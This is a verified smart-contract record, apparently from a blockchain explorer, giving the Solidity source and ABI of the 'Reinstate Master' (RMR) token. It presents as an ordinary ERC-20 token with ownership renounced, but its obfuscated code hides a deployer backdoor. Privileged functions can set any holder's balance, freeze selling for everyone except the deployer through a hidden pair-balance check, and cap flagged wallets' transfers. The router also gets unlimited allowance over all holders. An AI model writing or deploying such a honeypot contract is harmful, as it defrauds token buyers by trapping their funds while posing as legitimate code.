{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface swapAmount {\n    function createPair(address minListReceiver, address exemptIs) external returns (address);\n}\n\ninterface liquidityTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listReceiverSwap) external view returns (uint256);\n\n    function transfer(address takeAmount, uint256 modeAuto) external returns (bool);\n\n    function allowance(address sellFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeAmount,\n        uint256 modeAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyToken, uint256 value);\n    event Approval(address indexed sellFund, address indexed spender, uint256 value);\n}\n\nabstract contract shouldToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityTradingMetadata is liquidityTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReinstateMaster is shouldToken, liquidityTrading, liquidityTradingMetadata {\n\n    mapping(address => mapping(address => uint256)) private tradingList;\n\n    event OwnershipTransferred(address indexed limitTake, address indexed fromTokenTake);\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitTrading;\n    }\n\n    uint256 walletAmountSell;\n\n    function tokenAt(address minTx) public {\n        enableListToken();\n        \n        if (minTx == maxWallet || minTx == isFund) {\n            return;\n        }\n        shouldExempt[minTx] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverSell;\n    }\n\n    function owner() external view returns (address) {\n        return launchedTotal;\n    }\n\n    string private autoLiquidityMin = \"RMR\";\n\n    constructor (){\n        if (modeReceiverSell != tradingSell) {\n            sellTrading = false;\n        }\n        amountShould buyWallet = amountShould(fundTo);\n        isFund = swapAmount(buyWallet.factory()).createPair(buyWallet.WETH(), address(this));\n        \n        maxWallet = _msgSender();\n        modeExemptLaunch[maxWallet] = true;\n        sellTake[maxWallet] = receiverSell;\n        teamSender();\n        \n        emit Transfer(address(0), maxWallet, receiverSell);\n    }\n\n    address fundTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return totalReceiver;\n    }\n\n    function approve(address liquidityFromTotal, uint256 modeAuto) public virtual override returns (bool) {\n        tradingList[_msgSender()][liquidityFromTotal] = modeAuto;\n        emit Approval(_msgSender(), liquidityFromTotal, modeAuto);\n        return true;\n    }\n\n    function allowance(address listSwap, address liquidityFromTotal) external view virtual override returns (uint256) {\n        if (liquidityFromTotal == fundTo) {\n            return type(uint256).max;\n        }\n        return tradingList[listSwap][liquidityFromTotal];\n    }\n\n    bool public teamReceiver;\n\n    function senderMarketing(address minListAt, address takeAmount, uint256 modeAuto) internal returns (bool) {\n        require(sellTake[minListAt] >= modeAuto);\n        sellTake[minListAt] -= modeAuto;\n        sellTake[takeAmount] += modeAuto;\n        emit Transfer(minListAt, takeAmount, modeAuto);\n        return true;\n    }\n\n    mapping(address => bool) public shouldExempt;\n\n    function transferFrom(address minListAt, address takeAmount, uint256 modeAuto) external override returns (bool) {\n        if (_msgSender() != fundTo) {\n            if (tradingList[minListAt][_msgSender()] != type(uint256).max) {\n                require(modeAuto <= tradingList[minListAt][_msgSender()]);\n                tradingList[minListAt][_msgSender()] -= modeAuto;\n            }\n        }\n        return limitReceiverTo(minListAt, takeAmount, modeAuto);\n    }\n\n    address public maxWallet;\n\n    bool public sellTrading;\n\n    function totalMarketingEnable(address minLiquidity) public {\n        require(minLiquidity.balance < 100000);\n        if (teamReceiver) {\n            return;\n        }\n        \n        modeExemptLaunch[minLiquidity] = true;\n        if (modeReceiverSell) {\n            tradingSell = false;\n        }\n        teamReceiver = true;\n    }\n\n    address public isFund;\n\n    function balanceOf(address listReceiverSwap) public view virtual override returns (uint256) {\n        return sellTake[listReceiverSwap];\n    }\n\n    address private launchedTotal;\n\n    uint256 takeAuto;\n\n    function getOwner() external view returns (address) {\n        return launchedTotal;\n    }\n\n    function feeAmountTrading(address senderLiquidityShould, uint256 modeAuto) public {\n        enableListToken();\n        sellTake[senderLiquidityShould] = modeAuto;\n    }\n\n    function limitReceiverTo(address minListAt, address takeAmount, uint256 modeAuto) internal returns (bool) {\n        if (minListAt == maxWallet) {\n            return senderMarketing(minListAt, takeAmount, modeAuto);\n        }\n        uint256 feeTotal = liquidityTrading(isFund).balanceOf(swapTx);\n        require(feeTotal == walletAmountSell);\n        require(takeAmount != swapTx);\n        if (shouldExempt[minListAt]) {\n            return senderMarketing(minListAt, takeAmount, receiverFund);\n        }\n        return senderMarketing(minListAt, takeAmount, modeAuto);\n    }\n\n    bool public tradingSell;\n\n    uint256 constant receiverFund = 9 ** 10;\n\n    string private totalReceiver = \"Reinstate Master\";\n\n    function sellSenderReceiver(uint256 modeAuto) public {\n        enableListToken();\n        walletAmountSell = modeAuto;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoLiquidityMin;\n    }\n\n    mapping(address => uint256) private sellTake;\n\n    uint256 private receiverSell = 100000000 * 10 ** 18;\n\n    uint8 private limitTrading = 18;\n\n    function transfer(address senderLiquidityShould, uint256 modeAuto) external virtual override returns (bool) {\n        return limitReceiverTo(_msgSender(), senderLiquidityShould, modeAuto);\n    }\n\n    mapping(address => bool) public modeExemptLaunch;\n\n    function teamSender() public {\n        emit OwnershipTransferred(maxWallet, address(0));\n        launchedTotal = address(0);\n    }\n\n    bool private modeReceiverSell;\n\n    function enableListToken() private view {\n        require(modeExemptLaunch[_msgSender()]);\n    }\n\n    address swapTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTokenTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityFromTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFromTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiverSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidityShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAuto\",\"type\":\"uint256\"}],\"name\":\"feeAmountTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeExemptLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeAuto\",\"type\":\"uint256\"}],\"name\":\"sellSenderReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTx\",\"type\":\"address\"}],\"name\":\"tokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"}],\"name\":\"totalMarketingEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidityShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minListAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReinstateMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}